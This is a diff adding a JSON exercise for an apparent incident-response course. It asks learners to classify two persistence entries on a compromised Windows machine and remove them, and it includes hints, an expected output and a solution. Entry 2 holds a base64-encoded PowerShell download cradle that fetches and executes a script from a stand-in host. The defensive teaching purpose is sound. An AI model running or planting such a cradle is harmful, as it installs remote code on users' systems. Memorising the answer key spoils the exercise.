@@ -1,0 +1,15 @@
+{
+    "id": "task1",
+    "chapterId": "ch_6",
+    "title": "Identify and Remove Persistence",
+    "description": "Analyze a system report and recommend eradication steps.",
+    "estimatedMinutes": 15,
+    "problemStatement": "You are analyzing a compromised Windows 10 workstation. You ran Autoruns and found the following suspicious entries:\n\n**Entry 1:**\n- Location: `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`\n- Value: `WindowsUpdate` = `C:\\Users\\Public\\Documents\\update.exe`\n- Status: File not signed. VirusTotal: 45/70 detections.\n\n**Entry 2:**\n- Location: Scheduled Tasks\n- Task Name: `AdobeFlashPlayerUpdate`\n- Action: `powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAXQAuAHAAcwAxACcAKQA=`\n\n**Task:**\n1. Identify the type of persistence for each entry.\n2. Explain why each is malicious.\n3. Provide the exact command(s) to remove Entry 1 and Entry 2.\n\n**Output Format:**\n```\nEntry 1:\n- Type: [Persistence Type]\n- Why Malicious: [Reason]\n- Removal Command: [Command]\n\nEntry 2:\n- Type: [Persistence Type]\n- Why Malicious: [Reason]\n- Removal Command: [Command]\n```",
+    "hints": [
+        "Entry 1 uses a Registry Run Key.",
+        "Entry 2 uses a Scheduled Task with encoded PowerShell (downloading a script).",
+        "Use `reg delete` for Entry 1, and `schtasks /delete` or `Unregister-ScheduledTask` for Entry 2."
+    ],
+    "expectedOutput": "Entry 1:\n- Type: Registry Run Key\n- Why Malicious: Unsigned executable in a public folder flagged by 45 AV vendors.\n- Removal Command: reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdate /f\n\nEntry 2:\n- Type: Scheduled Task\n- Why Malicious: Encoded PowerShell command downloads and executes a remote script (download cradle).\n- Removal Command: Unregister-ScheduledTask -TaskName \"AdobeFlashPlayerUpdate\" -Confirm:$false",
+    "solutionCode": "Entry 1:\n- Type: Registry Run Key (Persistence)\n- Why Malicious: File located in public user directory with low reputation score indicates malware.\n- Removal Command: reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdate /f\n\nEntry 2:\n- Type: Scheduled Task\n- Why Malicious: Encoded PowerShell command is a known malware download cradle technique (MITRE T1059.001).\n- Removal Command: Unregister-ScheduledTask -TaskName \"AdobeFlashPlayerUpdate\" -Confirm:$false"
+}
